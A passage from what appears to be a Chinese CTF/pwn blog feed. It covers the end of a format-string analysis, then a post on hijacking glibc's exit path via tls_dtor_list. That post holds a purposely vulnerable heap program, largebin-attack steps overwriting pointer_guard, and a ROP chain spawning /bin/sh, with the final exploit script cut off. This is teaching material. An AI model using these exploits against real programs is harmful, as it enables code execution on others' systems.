pa_wchar, <span class="type">wint_t</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_CHAR:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_SHORT:		<span class="comment">/* Promoted.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == INT_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT, pa_int, <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> <span class="string">&quot;he?&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">case</span> PA_FLOAT:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">	T (PA_DOUBLE, pa_double, <span class="type">double</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_double = va_arg (*ap_savep, <span class="type">double</span>);</span><br><span class="line">	    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class="type">_Float128</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class="type">long</span> <span class="type">double</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PA_STRING:				<span class="comment">/* All pointers are the same */</span></span><br><span class="line">      <span class="keyword">case</span> PA_WSTRING:			<span class="comment">/* All pointers are the same */</span></span><br><span class="line">	T (PA_POINTER, pa_pointer, <span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> T</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">	<span class="keyword">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class="type">void</span> *);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class="literal">NULL</span>)</span><br><span class="line">		 &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class="line">	    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class="line">	      (args_value[cnt].pa_user, ap_savep);</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  <span class="built_in">memset</span> (&amp;args_value[cnt], <span class="number">0</span>, <span class="keyword">sizeof</span> (args_value[cnt]));</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">	<span class="comment">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class="line"><span class="comment">	   strings.  We have no way to determine their type.  */</span></span><br><span class="line">	assert ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>);</span><br><span class="line">	__libc_fatal (<span class="string">&quot;*** invalid %N$ use detected ***\n&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>第一个 <code>switch</code></strong>：解析格式说明符并确定各个参数的类型和大小，建立参数类型映射。</p>
<p><strong>第二个 <code>switch</code></strong>：根据映射提取实际参数，确保能够正确处理可变参数列表，确保每个参数的类型和大小都被正确使用。</p>
<p>最后会统一处理格式化说明符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Now walk through all format specifiers and process them.  */</span></span><br><span class="line">  <span class="keyword">for</span> (; (<span class="type">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class="line">    &#123;</span><br><span class="line">      ..............................</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001121745055.png"
                      class=""
                >
<p>这里步过一次后会跳转到这个位置，我们能发现rcx被指向了./pwn，也就是第一次15偏移处的位置，执行两次后就把原来指向程序名的指针修改了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001122059746.png"
                      class=""
                >
<p>之后再处理后，会发现改的是原来的的内容，<code>./</code>被改成了<code>\x08\x12</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001123259237.png"
                      class=""
                >
<p>分析到这其实大体原理已经清晰了，如果硬要从源码分析的话也定位到了相关函数，但感觉再分析下去效率太低了，以后有研究的需求再深入分析吧。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>format string</tag>
      </tags>
  </entry>
  <entry>
    <title>tls_dtor_list劫持exit执行-高版本glibc利用思路之一</title>
    <url>/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/</url>
    <content><![CDATA[<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>主要链条：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors</span><br></pre></td></tr></table></figure></div>
<p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)     PTR_MANGLE (var)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ THREAD_GET_POINTER_GUARD ())</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GET_POINTER_GUARD() \</span></span><br><span class="line"><span class="meta">  THREAD_GETMEM (THREAD_SELF, header.stack_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GETMEM(descr, member) \</span></span><br><span class="line"><span class="meta">  descr-&gt;member</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">	 potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>很清楚能看到如果<code>tls_dtor_list</code>不为空，就会把cur指针指向<code>tls_dtor_list</code>，然后将其中func的函数指针字段经过<code>PTR_DEMANGLE</code>处理后，直接作为函数调用，参数是<code>cur-&gt;obj</code>。</p>
<p><code>tls_dtor_list</code>记录了<code>dtor_list</code>这个单向链表的表头，我们可以通过覆盖<code>tls_dtor_list</code>的值为一个我们可控的内存区域，然后就能伪造各个字段了。但最麻烦的是在调用func前有一个异或的逻辑，实际上会与<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>处的内容进行异或，那我们首先要想办法泄露出这个内容，或者是直接改写这个位置的内容，才可以调用我们想要的函数。所以一般会利用largebin attack或者unsortedbin attack两次，完成<code>tls_dtor_list</code>的修改以及对<code>tcbhead_t-&gt;pointer_guard</code>的修改。</p>
<h4 id="汇编实现"><a href="#汇编实现" class="headerlink" title="汇编实现"></a>汇编实现</h4><p>主要逻辑如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;__call_tls_dtors+<span class="number">17</span>&gt;    mov    rbp, qword ptr fs:[rbx]             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">21</span>&gt;    test   rbp, rbp                            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">24</span>&gt;    je     __call_tls_dtors+<span class="number">93</span>         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">26</span>&gt;    nop    word ptr [rax + rax]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">32</span>&gt;    mov    rdx, qword ptr [rbp + <span class="number">0x18</span>]         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">36</span>&gt;    mov    rax, qword ptr [rbp]                </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">40</span>&gt;    ror    rax, <span class="number">0x11</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">44</span>&gt;    xor    rax, qword ptr fs:[<span class="number">0x30</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">53</span>&gt;    mov    qword ptr fs:[rbx], rdx             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">57</span>&gt;    mov    rdi, qword ptr [rbp + <span class="number">8</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">61</span>&gt;    call   rax    </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">63</span>&gt;    mov    rax, qword ptr [rbp + <span class="number">0x10</span>]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">67</span>&gt;    lock sub qword ptr [rax + <span class="number">0x468</span>], <span class="number">1</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">76</span>&gt;    mov    rdi, rbp</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">79</span>&gt;    call   <span class="built_in">free</span>@plt                    &lt;<span class="built_in">free</span>@plt&gt;</span><br></pre></td></tr></table></figure></div>
<p>先是会把rbp指向<code>tls_dtor_list</code>，也就是<code>dtor_list</code>链表的头节点，正是我们修改的地方。然后取出func字段后，会先右移0x11位，再与<code>fs:[0x30]</code>处的内容异或。最后call进行调用。那么我们传func字段时就先异或再左移，就能够解出正确的函数指针。需要注意的是，如果我们不是直接利用头节点处的<code>dtor_list</code>，map域也要进行伪造，使<code>map+0x468</code>为一个可写地址，而且之后的<code>free</code>也需要想办法绕过，所以最好还是直接一次直接利用完成。因为这里<code>mov rdx, qword ptr [rbp + 0x18]</code>直接把rdx拉到我们可控的堆区域了，而且我们控制next域就可以控制rdx的值，其实我们也可以走<code>setcontext</code>的打法。</p>
<h4 id="利用验证"><a href="#利用验证" class="headerlink" title="利用验证"></a>利用验证</h4><p>自己写一个堆的菜单题，不做什么限制方便原理验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *chunk_list[<span class="number">32</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice &gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx, size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    chunk_list[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx,size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_list[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">void</span> *libc_base = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;puts_addr:%p\n&quot;,&amp;puts);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_base:%p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            delete ();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            end();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>首先泄露libc基址和heap基址，这里libc基址我直接在主程序中打印出来了，其实也可以通过<code>show largebin</code>来获得。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123022279.png"
                      class=""
                >
<p>然后free掉一个和0x430那个larginbin属于一个大小范围的，但又比0x430小的chunk3，修改以及在largebin中的那个chunk的bk_nextsize域为<code>target_addr-0x20</code>，然后申请一个大chunk，从topchunk分配，并把chunk3置入largebin，触发largebin attack，往<code>target_addr</code>写chunk3的地址。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123458788.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123536544.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123654313.png"
                      class=""
                >
<p>然后故技重施，再来次largebin attack改<code>tcbhead_t-&gt;pointer_guard</code>为一个我们知道的堆地址，这里我们可以先把<code>fake_dtor_list-&gt;next</code>改成一个可控的堆区域先，方便后面栈迁移。这里<code>fs_base</code>的地址相对于libc基址是固定的，计算一下就可以得出。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241127183520245.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124109770.png"
                      class=""
                >
<p>这里的key就是我们写到<code>fs:0x30</code>的地址，最后利用chunk2把chunk3（fake_dtor_list）的func域改为加密后的<code>setcontext+61</code>，由于我们之前把next域设置为了chunk2的data域的地址，所以这里rdx就会指向chunk2的data域，这样我们在改chunk2时，设置rsp为一个可写地址，rbp为栈迁移目标地址-8，rcx为<code>leave;ret</code>地址，最终就能栈迁移到我们可控的堆段上，这里我们迁移到了chunk8的data域，chunk8写rop链即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124932862.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124955592.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125025834.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125109454.png"
                      class=""
                >
<p>exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;pwn.challenge.ctf.show&quot;,28310)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">libc = ELF(<span 